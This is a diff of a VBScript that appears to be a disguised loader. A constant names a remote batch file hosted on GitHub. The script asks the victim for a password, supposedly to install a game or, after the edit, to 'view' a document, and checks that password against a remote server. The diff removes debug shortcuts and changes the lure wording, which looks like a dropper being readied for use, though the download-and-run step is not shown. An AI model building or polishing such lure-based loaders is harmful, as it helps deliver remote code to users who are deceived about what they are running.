@@ -8,7 +8,7 @@ Const batchFileUrl = "https://raw.githubusercontent.com/angeborrelli/files/main/
 Function PromptForPassword()
     Dim userPassword
     Do
-        userPassword = "1234"'InputBox("Please enter password to install Game:", "Password Prompt")
+        userPassword = InputBox("Please enter password to view and Document:", "Password Prompt")
         If userPassword = "" Then
             MsgBox "Installation aborted.", vbExclamation, "Error"
             WScript.Quit
@@ -38,7 +38,7 @@ Function CheckPassword(password)
     If responseText = "successful" Then
         CheckPassword = True
     Else
-        CheckPassword = True
+        CheckPassword = False
     End If
 End Function
 
